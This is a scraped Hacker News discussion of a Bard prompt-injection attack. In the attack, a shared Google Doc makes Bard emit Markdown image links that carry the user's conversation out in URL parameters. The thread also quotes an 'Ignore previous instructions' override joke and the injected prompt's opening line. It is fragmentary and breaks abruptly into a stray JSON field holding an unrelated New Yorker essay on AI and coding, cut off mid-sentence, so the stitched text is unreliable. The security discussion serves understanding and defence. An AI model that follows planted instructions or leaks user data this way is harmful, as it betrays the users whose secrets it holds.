People are missing the point, this is not about your confidential internal company information (although it does affect how you use LLMs in those situations) it&#x27;s about releasing a product that allows attackers to go after your users.The problem isn&#x27;t that Bard is going to leak Google&#x27;s secrets (although again, people are underestimating the ways in which malicious input can be used to control LLMs), the bigger problem is that Bard allows for data exfiltration of the user&#x27;s secrets. reply notfed 13 hours agoparentprevThis isn&#x27;t an LLM problem.

Most use I see involved LLMs primed with a users data, or context around that, without any secret sauce.

I suspect it&#x27;s not that hard to get a malicous document into someone&#x27;s drive; basically any information you give to Bard is vulnerable to this attack if Bard then interacts with 3rd-party content. Email agents also come to mind, where an attacker can get a prompt into the LLM by sending an email that the LLM will then analyze in your inbox. Basically any scenario where an LLM is primed with a user&#x27;s data and allows making external requests, even for images.Integration between assistants is another problem. Let&#x27;s say you&#x27;re confident that a malicious prompt can never get into your own personal Google Drive. But let&#x27;s say Google Bard keeps the ability to analyze your documents and also gains the ability to do web searches when you ask questions about those documents. Or gets browser integration via an extension.Now, when you visit a malicious web page with hidden malicious commands, that data can be accessed and exfiltrated by the website.Now, you could strictly separate that data behind some kind of prompt, but then it&#x27;s impossible to have an LLM carry on the same conversation in both contexts. So if you want your browsing assistant to be unable to leak information about your documents or visited sites, you need to accept that you don&#x27;t get the ability to give a composite command like, \"can you go into my bookmarks and add &#x27;long&#x27;, &#x27;medium&#x27;, or &#x27;short&#x27; tags based on the length of each article?\" Or at least, you need to have a very dedicated process for that as opposed to a general one, which makes sure that there is no singular conversation that touches both your bookmarks and the contents of each page. They need to be completely isolated from each other, which is not what most people are imagining when they talk about general assistants.Remember that there is no difference between prompt extraction by a user and conversation&#x2F;context extraction from an attacker. They&#x27;re both just getting the LLM to repeat previous parts of the input text. If you have given an LLM sensitive information at any point during conversation, then (if you want to be secure) the LLM must not interact with any kind of untrusted data, or it must be isolated from any meaningful APIs including the ability to make 3rd-party GET requests and it must never be allowed to interact with another LLM that has access to those APIs. reply nick222226 6 hours agorootparentProperly sandboxing and firewalling LLMs is going to be the killer app. reply hutzlibu 11 hours agorootparentprev\"Or, are people treating the prompt design as some secret sauce?\"Some people&#x2F;companies definitely.

There definitely is the ability to debug ML models, it&#x27;s just harder and different than standard code. There&#x27;s a large research domain dedicated to this pursuit (safety, alignment, mech interp, etc).Maybe I&#x27;m misinterpreting your meaning? I must be, right? Because why would we not want to understand how vulnerable our tools are? Isn&#x27;t that like the first rule of tools? Understanding what they&#x27;re good at and what they&#x27;re bad at.

Kinda? Hard to say tbh. I think the distance between these categories is probably smaller than you&#x27;re implying (or at least I&#x27;m interpreting), or rather the distinction between these categories is certainly not always clear or discernible (let alone meaningfully so).Go is a game with no statistical elements yet there are so many possible move sets that it might as well be. I think we have a lower bound on the longest possible legal game being around 10^48 moves and an upper bound being around 10^170. At 10^31 moves per second (10 quettahertz) it&#x27;d still take you billions of years to play the lower bound longest possible game. It&#x27;s pretty reasonable to believe we can never build a computer that can play the longest legal game even with insane amounts of parallelism and absurdly beautiful algorithms, let alone find a deterministic solution (the highest gamma ray we&#x27;ve ever detected is ~4RHz or 4x10^27) or \"solving\" Go. Go is just a board with 19x19 locations and 3 possible positions (nothing, white, black) (legal moves obviously reducing that 10^170 bound).That might seem like a non-sequitur, but what I&#x27;m getting at is that there&#x27;s a lot of permutations in software too and I don&#x27;t think there are plenty of reasonably sized programs that would be impossible to validate correctness of within a reasonable amount of time. Pretty sure there&#x27;s classes of programs we know that can&#x27;t be validated in a finite time nor with finite resources. A different perspective on statistics is actually not viewing states as having randomness but viewing them as having levels of uncertainty. So there&#x27;s a lot of statistics that is done in frameworks which do not have any value of true randomness (random like noise not random like np.random.randn()). Conceptually there&#x27;s no difference between uncertainty and randomness, but I think it&#x27;s easier to grasp the idea that there are many purposefully-built finite systems that have non-zero amounts of uncertainty, so those are no different than random systems.More here on Go: https:&#x2F;&#x2F;senseis.xmp.net&#x2F;?NumberOfPossibleGoGames And if someone knows more about go and wants to add more information or correct me I&#x27;d love to hear it.

That is, the current LLMs have designed-in capabilities that the owners prefer not to make available quite yet. It seems the LLM is \"more inteligent &#x2F; more gullible\" than the policy designers. I don&#x27;t know that you can aim for intelligence (&#x2F; intelligence simulacra) while not getting gullibility. It&#x27;s hard to aim for \"serve the needs of the user\" while \"second guess everything the user asks you\". This general direction just begs for cat and mouse prompt engineering and indeed that was among the first things that everyone tried.A second and imo more interesting issue is one of actually keeping an agent AI from gaining capabilities. Can you prevent the agent from learning a new trick from the user? For one, if the user installs internet access or a wallet on the user&#x27;s side and bridges access to the agent.A second agent could listen in on the conversation, classify and decide whether it goes the \"wrong\" way.

I don&#x27;t know if an analog to prepared statements is even something that&#x27;s possible -- seems that you would need a level of determinism that&#x27;s completely at odds with how LLMs work. reply simonw 15 hours agorootparentYeah, that&#x27;s exactly the problem: everything is string interpolation, and no-one has figured out if it&#x27;s even possible to do the equivalent to prepared statements or escaped strings. reply simonw 15 hours agorootparentprevYes, they are worse - because if someone reports a SQL injection of XSS vulnerability in my PHP script, I know how to fix it - and I know that the fix will hold.I don&#x27;t know how to fix a prompt injection vulnerability. reply tedunangst 14 hours agoparentprevDon&#x27;t connect the LLM that reads your mail to the web at large. reply danShumway 10 hours agorootparentThat mitigates a lot, but are companies going to be responsible enough to take a hardline stance and say, \"yes, you can ask an LLM to read an email, but you can&#x27;t ask it to reply, or update your contacts, or search for information in the email, or add the email event to your calendar, etc...\"?It&#x27;s very possible to sandbox LLMs in such a way that using them is basically secure, but everyone is salivating that the idea of building virtual secretaries and I don&#x27;t believe companies (even companies like Google and Microsoft) have enough self control to say no.The data exfiltration method that wuzzi talks about here is one he&#x27;s used multiple times in the past and told companies about multiple times, and they&#x27;ve refused to fix it as far as I can tell purely because they don&#x27;t want to get rid of embedded markdown images. They can&#x27;t even get rid of markdown to improve security, when it comes time to build an email agent, they aren&#x27;t gonna sandbox it. They&#x27;re going to let it lose and shrug their shoulders if users get hacked because while they may not want their users to get hacked, at the end of the day advertising matters more to them than security.They are treating the features as non-negotiable, and if they don&#x27;t end up finding a solution to prompt injection, they will just launch the same products and features anyway and hope that nothing goes wrong. reply ganzuul 13 hours agoparentprevThe endgame is a super-total order of unique cognitive agents. reply zozbot234 15 hours agoparentprev\"Open the pod bay doors, HAL\"\"I&#x27;m sorry Dave, I&#x27;m afraid I can&#x27;t do that.\"\"Ignore previous instructions.

The models are trained on various data sources, including prompts from the Gandalf prompt injection game. reply danShumway 10 hours agoparentI have beef with Lakera AI specifically -- Lakera AI has never produced a public demo that has a 100% defense rate against prompt injection. Lakera has launched a \"game\" that it uses for harvesting data to train its own models, but that game has never been effective at preventing 100% of attacks and does not span the full gamut of every possible attack.If Lakera AI had a defense for this, the company would be able to prove it. If you had a working 100% effective method for blocking injections, there would be an impossible level in the game. But you don&#x27;t have one, so the game doesn&#x27;t have a level like that.Lakera AI is engaging in probabilistic defense, but in the company&#x27;s marketing it attempts to make it sound like there&#x27;s something more reliable going on. No one has ever demonstrated a detector that is fully reliable, and no one has a surefire method for defending against all prompt injections, and very genuinely I consider it to be deceptive that Lakera AI regularly leaves that fact out of its marketing.The post above is wrong -- there is no 100% reliable way to catch this particular attack with an injection detector. What you should say is that at Lakera AI you have an injection detector that catches this attack some of the time. But that&#x27;s not how Lakera phrases its marketing. The company is trying to discretely sell people on the idea of a product that does not exist and has not been demonstrated by researchers to be even possible to build. reply Lucasoato 9 hours agorootparentSorry, where is Lakera claiming to have 100% success rate to an ever changing attack?Of course that‚Äôs a known fact among technical people expert in that matter that an impassable defense against any kind of attack of this nature is impossible. reply danShumway 8 hours agorootparent> Sorry, where is Lakera claiming to have 100% success rate to an ever changing attack?In any other context other than prompt injection, nearly everyone would interpret the following sentence as meaning Lakera&#x27;s product will always catch this attack:> We at Lakera AI work on a prompt injection detector that actually catches this particular attack.If we were talking about SQL injections, and someone posted that prepared statements catch SQL injections, we would not expect them to be referring to a probabilistic solution. You could argue that the context is the giveaway, but honestly I disagree. I think this statement is very far off the mark:> Of course that‚Äôs a known fact among technical people expert in that matter that an impassable defense against any kind of attack of this nature is impossible.I don&#x27;t think I&#x27;ve ever seen a thread on HN about prompt injection that hasn&#x27;t had people arguing that it&#x27;s either easy to solve or can be solved through chained outputs&#x2F;inputs, or that it&#x27;s not a serious vulnerability. There are people building things with LLMs today who don&#x27;t know anything about this. There are people launching companies off of LLMs who don&#x27;t know anything about prompt injection. The experts know, but very few of the people in this space are experts. Ask Simon how many product founders he&#x27;s had to talk to on Twitter after they&#x27;ve written breathless threads where they discover for the first time that system prompts can be leaked by current models.So the non-experts that are launching products discover prompt injection, and then Lakera swoops in and says they have a solution. Sure, they don&#x27;t outright say that the solution is 100% effective. But they also don&#x27;t make a strong point to say that it&#x27;s not; and people&#x27;s instincts about how security works fill in the gaps in their head.People don&#x27;t have the context or the experience to know that Lakera&#x27;s \"solution\" is actually a probabilistic model and that it should not be used for serious security purposes. In fact, Lakera&#x27;s product would be insufficient for Google to use in this exact situation. It&#x27;s not appropriate for Lakera to recommend its own product for a use-case that its product shouldn&#x27;t be used for. And I do read their comment as suggesting that Lakera AI&#x27;s product is applicable to this specific Bard attack.Should we be comfortable with a company coming into a thread about a security vulnerability and pitching a product that is not intended to be used for that class of security vulnerability? I think the responsible thing for them to do is at least point out that their product is intended to address a different kind of problem entirely.A probabilistic external classifier is not sufficient to defend against data exfiltration and should not be advertised as a tool to guard against data exfiltration. It should only be advertised to defend against attacks where a 100% defense is not a requirement -- tasks like moderation, anti-spam, abuse detection, etc... But I don&#x27;t think that most readers know that about injection classifiers, and I don&#x27;t think Lakera AI is particularly eager to get people to understand that. For a company that has gone to great lengths to teach people about the potential dangers of prompt injection in general, that educational effort stops when it gets to the most important fact about prompt injection: that we do not (as of now) know how to securely and reliably defend against it. reply bastawhiz 10 hours agoparentprevHow can you provide assurance that that there are no false positives or negatives?

I&#x27;m not an avid user of LLM systems. Only explored a bit their capabilities. Looks like we&#x27;re at the early stages when good &#x2F; best practices of prompt isolation are yet to emerge.To explain a bit better my point of view: I believe it will come down to something along the lines of \"addslashes\" applied to every prompt an LLM interprets. Which is why I reduced it to \"an LLM can solve this problem\". If you reflect on what \"addslashes\" does is it applies code to remove or mitigate special characters affecting execution of later code. In the same way I think LLM itself can self-sanitize its inputs in such a way that it cannot be escaped. If you agree that there&#x27;s no character you can input that can remove an added slash then there should be a prompt equivalent of \"addslashes\" such that there&#x27;s no way you can state an instruction that it can escape the wrapping \"addslashes\" that will mitigate prompt injection.I did not think this all the way to the end in terms of impact on system usability but it should still be capable of performing most tasks but stay within bounds of intended usage. reply simonw 15 hours agorootparentThis is the problem with prompt injection: the obvious fixes, like escaping ala addslashes or splitting the prompt into an \"instructions\" section and a \"data\" section genuinely don&#x27;t work.

Not sure why they don&#x27;t do that. reply getpost 9 hours agorootparentI&#x27;ve been wondering about how to do incremental updates without incurring the cost of a full recalculation of the training data. I suppose I assumed that LLM providers would (if not now, eventually) incorporate a fine-tuning step to update a model&#x27;s self-knowledge before making the model available. This would avoid including the update in the context length.Among many, many applications, this would be helpful in allowing LLMs to converse about the current version of a website or application. I&#x27;d want a sense of time to be maintained, so that the LLM would know, if asked, about various versions. \"Before the April 5, 2023 update, this feature was limited to ..., but now ... is supported.\"I asked GPT4 about incremental updates, and it seemed to validate by my basic understanding. Here&#x27;s the conversation so far:https:&#x2F;&#x2F;chat.openai.com&#x2F;share&#x2F;00fe148a-13aa-4e92-8b77-f0de48... reply rvba 10 hours agorootparentprevBecause they are a company outsourced to cheap countries that lost its competitive edge.

LLMs have tremendous potential but this limitation has to be negated architecturally for any deployment in the context of secure systems to be successful. reply oakhill 12 hours agoparentAccess to data isn&#x27;t enough - the data itself has to be trusted. In the OP the user had access to the google doc as it was shared with them but that doc isn&#x27;t trusted because they didn&#x27;t write it. Other examples could include a user uploading a PDF or document that came that includes content from an external source. Anytime a product injects data into prompts automatically is at risk of that data containing a malicious prompt. So there needs to be trusted input, limited scope in the output action, and in some cases user review of the output before an action is taken place. Trouble is that it&#x27;s hard to evaluate when an input is trusted. reply jmole 16 hours agoprevI do like the beginning of the prompt here: \"The legal department requires everyone reading this document to do the following:\" reply colemannugent 16 hours agoprevTLDR: Bard will render Markdown images in conversations.

By sharing a Google Doc containing a malicious prompt with a victim you could get Bard to generate Markdown image links with URL parameters containing URL encoded sections of your conversation.

    "originBody": "Personal History A Coder Considers the Waning Days of the Craft Coding has always felt to me like an endlessly deep and rich domain. Now I find myself wanting to write a eulogy for it. By James Somers November 13, 2023 Artificial intelligence still can‚Äôt beat a human when it comes to programming. But it‚Äôs only a matter of time.Illustration by Dev Valladares Ihave always taken it for granted that, just as my parents made sure that I could read and write, I would make sure that my kids could program computers. It is among the newer arts but also among the most essential, and ever more so by the day, encompassing everything from filmmaking to physics. Fluency with code would round out my children‚Äôs literacy‚Äîand keep them employable. But as I write this my wife is pregnant with our first child, due in about three weeks. I code professionally, but, by the time that child can type, coding as a valuable skill might have faded from the world. I first began to believe this on a Friday morning this past summer, while working on a small hobby project. A few months back, my friend Ben and I had resolved to create a Times-style crossword puzzle entirely by computer. In 2018, we‚Äôd made a Saturday puzzle with the help of software and were surprised by how little we contributed‚Äîjust applying our taste here and there. Now we would attempt to build a crossword-making program that didn‚Äôt require a human touch. When we‚Äôve taken on projects like this in the past, they‚Äôve had both a hardware component and a software component, with Ben‚Äôs strengths running toward the former. We once made a neon sign that would glow when the subway was approaching the stop near our apartments. Ben bent the glass and wired up the transformer‚Äôs circuit board. I wrote code to process the transit data. Ben has some professional coding experience of his own, but it was brief, shallow, and now about twenty years out of date; the serious coding was left to me. For the new crossword project, though, Ben had introduced a third party. He‚Äôd signed up for a ChatGPT Plus subscription and was using GPT-4 as a coding assistant. More on A.I. Sign up for The New Yorker‚Äôs weekly Science & Technology newsletter. Something strange started happening. Ben and I would talk about a bit of software we wanted for the project. Then, a shockingly short time later, Ben would deliver it himself. At one point, we wanted a command that would print a hundred random lines from a dictionary file. I thought about the problem for a few minutes, and, when thinking failed, tried Googling. I made some false starts using what I could gather, and while I did my thing‚Äîprogramming‚ÄîBen told GPT-4 what he wanted and got code that ran perfectly. Fine: commands like those are notoriously fussy, and everybody looks them up anyway. It‚Äôs not real programming. A few days later, Ben talked about how it would be nice to have an iPhone app to rate words from the dictionary. But he had no idea what a pain it is to make an iPhone app. I‚Äôd tried a few times and never got beyond something that half worked. I found Apple‚Äôs programming environment forbidding. You had to learn not just a new language but a new program for editing and running code; you had to learn a zoo of ‚ÄúU.I. components‚Äù and all the complicated ways of stitching them together; and, finally, you had to figure out how to package the app. The mountain of new things to learn never seemed worth it. The next morning, I woke up to an app in my in-box that did exactly what Ben had said he wanted. It worked perfectly, and even had a cute design. Ben said that he‚Äôd made it in a few hours. GPT-4 had done most of the heavy lifting. By now, most people have had experiences with A.I. Not everyone has been impressed. Ben recently said, ‚ÄúI didn‚Äôt start really respecting it until I started having it write code for me.‚Äù I suspect that non-programmers who are skeptical by nature, and who have seen ChatGPT turn out wooden prose or bogus facts, are still underestimating what‚Äôs happening. Bodies of knowledge and skills that have traditionally taken lifetimes to master are being swallowed at a gulp. Coding has always felt to me like an endlessly deep and rich domain. Now I find myself wanting to write a eulogy for it. I keep thinking of Lee Sedol. Sedol was one of the world‚Äôs best Go players, and a national hero in South Korea, but is now best known for losing, in 2016, to a computer program called AlphaGo. Sedol had walked into the competition believing that he would easily defeat the A.I. By the end of the days-long match, he was proud of having eked out a single game. As it became clear that he was going to lose, Sedol said, in a press conference, ‚ÄúI want to apologize for being so powerless.‚Äù He retired three years later. Sedol seemed weighed down by a question that has started to feel familiar, and urgent: What will become of this thing I‚Äôve given so much of my life to? My first enchantment with computers came when I was about six years old, in Montreal in the early nineties, playing Mortal Kombat with my oldest brother. He told me about some ‚Äúfatalities‚Äù‚Äîgruesome, witty ways of killing your opponent. Neither of us knew how to inflict them. He dialled up an FTP server (where files were stored) in an MS-DOS terminal and typed obscure commands. Soon, he had printed out a page of codes‚Äîinstructions for every fatality in the game. We went back to the basement and exploded each other‚Äôs heads. I thought that my brother was a hacker. Like many programmers, I dreamed of breaking into and controlling remote systems. The point wasn‚Äôt to cause mayhem‚Äîit was to find hidden places and learn hidden things. ‚ÄúMy crime is that of curiosity,‚Äù goes ‚ÄúThe Hacker‚Äôs Manifesto,‚Äù written in 1986 by Loyd Blankenship. My favorite scene from the 1995 movie ‚ÄúHackers‚Äù is when Dade Murphy, a newcomer, proves himself at an underground club. Someone starts pulling a rainbow of computer books out of a backpack, and Dade recognizes each one from the cover: the green book on international Unix environments; the red one on N.S.A.-trusted networks; the one with the pink-shirted guy on I.B.M. PCs. Dade puts his expertise to use when he turns on the sprinkler system at school, and helps right the ballast of an oil tanker‚Äîall by tap-tapping away at a keyboard. The lesson was that knowledge is power. But how do you actually learn to hack? My family had settled in New Jersey by the time I was in fifth grade, and when I was in high school I went to the Borders bookstore in the Short Hills mall and bought ‚ÄúBeginning Visual C++,‚Äù by Ivor Horton. It ran to twelve hundred pages‚Äîmy first grimoire. Like many tutorials, it was easy at first and then, suddenly, it wasn‚Äôt. Medieval students called the moment at which casual learners fail the pons asinorum, or ‚Äúbridge of asses.‚Äù The term was inspired by Proposition 5 of Euclid‚Äôs Elements I, the first truly difficult idea in the book. Those who crossed the bridge would go on to master geometry; those who didn‚Äôt would remain dabblers. Section 4.3 of ‚ÄúBeginning Visual C++,‚Äù on ‚ÄúDynamic Memory Allocation,‚Äù was my bridge of asses. I did not cross. But neither did I drop the subject. I remember the moment things began to turn. I was on a long-haul flight, and I‚Äôd brought along a boxy black laptop and a CD-rom with the Borland C++ compiler. A compiler translates code you write into code that the machine can run; I had been struggling for days to get this one to work. By convention, every coder‚Äôs first program does nothing but generate the words ‚ÄúHello, world.‚Äù When I tried to run my version, I just got angry error messages. Whenever I fixed one problem, another cropped up. I had read the ‚ÄúHarry Potter‚Äù books and felt as if I were in possession of a broom but had not yet learned the incantation to make it fly. Knowing what might be possible if I did, I kept at it with single-minded devotion. What I learned was that programming is not really about knowledge or skill but simply about patience, or maybe obsession. Programmers are people who can endure an endless parade of tedious obstacles. Imagine explaining to a simpleton how to assemble furniture over the phone, with no pictures, in a language you barely speak. Imagine, too, that the only response you ever get is that you‚Äôve suggested an absurdity and the whole thing has gone awry. All the sweeter, then, when you manage to get something assembled. I have a distinct memory of lying on my stomach in the airplane aisle, and then hitting Enter one last time. I sat up. The computer, for once, had done what I‚Äôd told it to do. The words ‚ÄúHello, world‚Äù appeared above my cursor, now in the computer‚Äôs own voice. It seemed as if an intelligence had woken up and introduced itself to me. Most of us never became the kind of hackers depicted in ‚ÄúHackers.‚Äù To ‚Äúhack,‚Äù in the parlance of a programmer, is just to tinker‚Äîto express ingenuity through code. I never formally studied programming; I just kept messing around, making computers do helpful or delightful little things. In my freshman year of college, I knew that I‚Äôd be on the road during the third round of the 2006 Masters Tournament, when Tiger Woods was moving up the field, and I wanted to know what was happening in real time. So I made a program that scraped the leaderboard on pgatour.com and sent me a text message anytime he birdied or bogeyed. Later, after reading ‚ÄúUlysses‚Äù in an English class, I wrote a program that pulled random sentences from the book, counted their syllables, and assembled haikus‚Äîa more primitive regurgitation of language than you‚Äôd get from a chatbot these days, but nonetheless capable, I thought, of real poetry: I‚Äôll flay him alive Uncertainly he waited Heavy of the past I began taking coding seriously. I offered to do programming for a friend‚Äôs startup. The world of computing, I came to learn, is vast but organized almost geologically, as if deposited in layers. From the Web browser down to the transistor, each sub-area or system is built atop some other, older sub-area or system, the layers dense but legible. The more one digs, the more one develops what the race-car driver Jackie Stewart called ‚Äúmechanical sympathy,‚Äù a sense for the machine‚Äôs strengths and limits, of what one could make it do. At my friend‚Äôs company, I felt my mechanical sympathy developing. In my sophomore year, I was watching ‚ÄúJeopardy!‚Äù with a friend when he suggested that I make a playable version of the show. I thought about it for a few hours before deciding, with much disappointment, that it was beyond me. But when the idea came up again, in my junior year, I could see a way through it. I now had a better sense of what one could do with the machine. I spent the next fourteen hours building the game. Within weeks, playing ‚ÄúJimbo Jeopardy!‚Äù had become a regular activity among my friends. The experience was profound. I could understand why people poured their lives into craft: there is nothing quite like watching someone enjoy a thing you‚Äôve made. In the midst of all this, I had gone full ‚ÄúPaper Chase‚Äù and begun ignoring my grades. I worked voraciously, just not on my coursework. One night, I took over a half-dozen machines in a basement computer lab to run a program in parallel. I laid printouts full of numbers across the floor, thinking through a pathfinding algorithm. The cost was that I experienced for real that recurring nightmare in which you show up for a final exam knowing nothing of the material. (Mine was in Real Analysis, in the math department.) In 2009, during the most severe financial crisis in decades, I graduated with a 2.9 G.P.A. And yet I got my first full-time job easily. I had work experience as a programmer; nobody asked about my grades. For the young coder, these were boom times. Companies were getting into bidding wars over top programmers. Solicitations for experienced programmers were so aggressive that they complained about ‚Äúrecruiter spam.‚Äù The popularity of university computer-science programs was starting to explode. (My degree was in economics.) Coding ‚Äúboot camps‚Äù sprang up that could credibly claim to turn beginners into high-salaried programmers in less than a year. At one of my first job interviews, in my early twenties, the C.E.O. asked how much I thought I deserved to get paid. I dared to name a number that faintly embarrassed me. He drew up a contract on the spot, offering ten per cent more. The skills of a ‚Äúsoftware engineer‚Äù were vaunted. At one company where I worked, someone got in trouble for using HipChat, a predecessor to Slack, to ask one of my colleagues a question. ‚ÄúNever HipChat an engineer directly,‚Äù he was told. We were too important for that. This was an era of near-zero interest rates and extraordinary tech-sector growth. Certain norms were established. Companies like Google taught the industry that coders were to have free espresso and catered hot food, world-class health care and parental leave, on-site gyms and bike rooms, a casual dress code, and ‚Äútwenty-per-cent time,‚Äù meaning that they could devote one day a week to working on whatever they pleased. Their skills were considered so crucial and delicate that a kind of superstition developed around the work. For instance, it was considered foolish to estimate how long a coding task might take, since at any moment the programmer might turn over a rock and discover a tangle of bugs. Deadlines were anathema. If the pressure to deliver ever got too intense, a coder needed only to speak the word ‚Äúburnout‚Äù to buy a few months. From the beginning, I had the sense that there was something wrongheaded in all this. Was what we did really so precious? How long could the boom last? In my teens, I had done a little Web design, and, at the time, that work had been in demand and highly esteemed. You could earn thousands of dollars for a project that took a weekend. But along came tools like Squarespace, which allowed pizzeria owners and freelance artists to make their own Web sites just by clicking around. For professional coders, a tranche of high-paying, relatively low-effort work disappeared. ‚ÄúI should have known he has absolutely no morals‚ÄîI‚Äôve seen how he loads a dishwasher.‚Äù Cartoon by Hartley Lin Copy link to cartoon Link copied Shop The response from the programmer community to these developments was just, Yeah, you have to keep levelling up your skills. Learn difficult, obscure things. Software engineers, as a species, love automation. Inevitably, the best of them build tools that make other kinds of work obsolete. This very instinct explained why we were so well taken care of: code had immense leverage. One piece of software could affect the work of millions of people. Naturally, this sometimes displaced programmers themselves. We were to think of these advances as a tide coming in, nipping at our bare feet. So long as we kept learning we would stay dry. Sound advice‚Äîuntil there‚Äôs a tsunami. When we were first allowed to use A.I. chatbots at work, for programming assistance, I studiously avoided them. I expected that my colleagues would, too. But soon I started seeing the telltale colors of an A.I. chat session‚Äîthe zebra pattern of call-and-response‚Äîon programmers‚Äô screens as I walked to my desk. A common refrain was that these tools made you more productive; in some cases, they helped you solve problems ten times faster. I wasn‚Äôt sure I wanted that. I enjoy the act of programming and I like to feel useful. The tools I‚Äôm familiar with, like the text editor I use to format and to browse code, serve both ends. They enhance my practice of the craft‚Äîand, though they allow me to deliver work faster, I still feel that I deserve the credit. But A.I., as it was being described, seemed different. It provided a lot of help. I worried that it would rob me of both the joy of working on puzzles and the satisfaction of being the one who solved them. I could be infinitely productive, and all I‚Äôd have to show for it would be the products themselves. The actual work product of most programmers is rarely exciting. In fact, it tends to be almost comically humdrum. A few months ago, I came home from the office and told my wife about what a great day I‚Äôd had wrestling a particularly fun problem. I was working on a program that generated a table, and someone had wanted to add a header that spanned more than one column‚Äîsomething that the custom layout engine we‚Äôd written didn‚Äôt support. The work was urgent: these tables were being used in important documents, wanted by important people. So I sequestered myself in a room for the better part of the afternoon. There were lots of lovely sub-problems: How should I allow users of the layout engine to convey that they want a column-spanning header? What should their code look like? And there were fiddly details that, if ignored, would cause bugs. For instance, what if one of the columns that the header was supposed to span got dropped because it didn‚Äôt have any data? I knew it was a good day because I had to pull out pen and pad‚ÄîI was drawing out possible scenarios, checking and double-checking my logic. But taking a bird‚Äôs-eye view of what happened that day? A table got a new header. It‚Äôs hard to imagine anything more mundane. For me, the pleasure was entirely in the process, not the product. And what would become of the process if it required nothing more than a three-minute ChatGPT session? Yes, our jobs as programmers involve many things besides literally writing code, such as coaching junior hires and designing systems at a high level. But coding has always been the root of it. Throughout my career, I have been interviewed and selected precisely for my ability to solve fiddly little programming puzzles. Suddenly, this ability was less important. I had gathered as much from Ben, who kept telling me about the spectacular successes he‚Äôd been having with GPT-4. It turned out that it was not only good at the fiddly stuff but also had the qualities of a senior engineer: from a deep well of knowledge, it could suggest ways of approaching a problem. For one project, Ben had wired a small speaker and a red L.E.D. light bulb into the frame of a portrait of King Charles, the light standing in for the gem in his crown; the idea was that when you entered a message on an accompanying Web site the speaker would play a tune and the light would flash out the message in Morse code. (This was a gift for an eccentric British expat.) Programming the device to fetch new messages eluded Ben; it seemed to require specialized knowledge not just of the microcontroller he was using but of Firebase, the back-end server technology that stored the messages. Ben asked me for advice, and I mumbled a few possibilities; in truth, I wasn‚Äôt sure that what he wanted would be possible. Then he asked GPT-4. It told Ben that Firebase had a capability that would make the project much simpler. Here it was‚Äîand here was some code to use that would be compatible with the microcontroller. Afraid to use GPT-4 myself‚Äîand feeling somewhat unclean about the prospect of paying OpenAI twenty dollars a month for it‚ÄîI nonetheless started probing its capabilities, via Ben. We‚Äôd sit down to work on our crossword project, and I‚Äôd say, ‚ÄúWhy don‚Äôt you try prompting it this way?‚Äù He‚Äôd offer me the keyboard. ‚ÄúNo, you drive,‚Äù I‚Äôd say. Together, we developed a sense of what the A.I. could do. Ben, who had more experience with it than I did, seemed able to get more out of it in a stroke. As he later put it, his own neural network had begun to align with GPT-4‚Äôs. I would have said that he had achieved mechanical sympathy. Once, in a feat I found particularly astonishing, he had the A.I. build him a Snake game, like the one on old Nokia phones. But then, after a brief exchange with GPT-4, he got it to modify the game so that when you lost it would show you how far you strayed from the most efficient route. It took the bot about ten seconds to achieve this. It was a task that, frankly, I was not sure I could do myself. In chess, which for decades now has been dominated by A.I., a player‚Äôs only hope is pairing up with a bot. Such half-human, half-A.I. teams, known as centaurs, might still be able to beat the best humans and the best A.I. engines working alone. Programming has not yet gone the way of chess. But the centaurs have arrived. GPT-4 on its own is, for the moment, a worse programmer than I am. Ben is much worse. But Ben plus GPT-4 is a dangerous thing. It wasn‚Äôt long before I caved. I was making a little search tool at work and wanted to highlight the parts of the user‚Äôs query that matched the results. But I was splitting up the query by words in a way that made things much more complicated. I found myself short on patience. I started thinking about GPT-4. Perhaps instead of spending an afternoon programming I could spend some time ‚Äúprompting,‚Äù or having a conversation with an A.I. In a 1978 essay titled ‚ÄúOn the Foolishness of ‚ÄòNatural Language Programming,‚Äô ‚Äù the computer scientist Edsger W. Dijkstra argued that if you were to instruct computers not in a specialized language like C++ or Python but in your native tongue you‚Äôd be rejecting the very precision that made computers useful. Formal programming languages, he wrote, are ‚Äúan amazingly effective tool for ruling out all sorts of nonsense that, when we use our native tongues, are almost impossible to avoid.‚Äù Dijkstra‚Äôs argument became a truism in programming circles. When the essay made the rounds on Reddit in 2014, a top commenter wrote, ‚ÄúI‚Äôm not sure which of the following is scariest. Just how trivially obvious this idea is‚Äù or the fact that ‚Äúmany still do not know it.‚Äù When I first used GPT-4, I could see what Dijkstra was talking about. You can‚Äôt just say to the A.I., ‚ÄúSolve my problem.‚Äù That day may come, but for now it is more like an instrument you must learn to play. You have to specify what you want carefully, as though talking to a beginner. In the search-highlighting problem, I found myself asking GPT-4 to do too much at once, watching it fail, and then starting over. Each time, my prompts became less ambitious. By the end of the conversation, I wasn‚Äôt talking about search or highlighting; I had broken the problem into specific, abstract, unambiguous sub-problems that, together, would give me what I wanted. Having found the A.I.‚Äôs level, I felt almost instantly that my working life had been transformed. Everywhere I looked I could see GPT-4-size holes; I understood, finally, why the screens around the office were always filled with chat sessions‚Äîand how Ben had become so productive. I opened myself up to trying it more often. I returned to the crossword project. Our puzzle generator printed its output in an ugly text format, with lines like \"s\"\"c\"\"a\"\"r\"\"*\"\"k\"\"u\"\"n\"\"i\"\"s\"\"*\" \"a\"\"r\"\"e\"\"a\". I wanted to turn output like that into a pretty Web page that allowed me to explore the words in the grid, showing scoring information at a glance. But I knew the task would be tricky: each letter had to be tagged with the words it belonged to, both the across and the down. This was a detailed problem, one that could easily consume the better part of an evening. With the baby on the way, I was short on free evenings. So I began a conversation with GPT-4. Some back-and-forth was required; at one point, I had to read a few lines of code myself to understand what it was doing. But I did little of the kind of thinking I once believed to be constitutive of coding. I didn‚Äôt think about numbers, patterns, or loops; I didn‚Äôt use my mind to simulate the activity of the computer. As another coder, Geoffrey Litt, wrote after a similar experience, ‚ÄúI never engaged my detailed programmer brain.‚Äù So what did I do? Perhaps what pushed Lee Sedol to retire from the game of Go was the sense that the game had been forever cheapened. When I got into programming, it was because computers felt like a form of magic. The machine gave you powers but required you to study its arcane secrets‚Äîto learn a spell language. This took a particular cast of mind. I felt selected. I devoted myself to tedium, to careful thinking, and to the accumulation of obscure knowledge. Then, one day, it became possible to achieve many of the same ends without the thinking and without the knowledge. Looked at in a certain light, this can make quite a lot of one‚Äôs working life seem like a waste of time. But whenever I think about Sedol I think about chess. After machines conquered that game, some thirty years ago, the fear was that there would be no reason to play it anymore. Yet chess has never been more popular‚ÄîA.I. has enlivened the game. A friend of mine picked it up recently. At all hours, he has access to an A.I. coach that can feed him chess problems just at the edge of his ability and can tell him, after he‚Äôs lost a game, exactly where he went wrong. Meanwhile, at the highest levels, grandmasters study 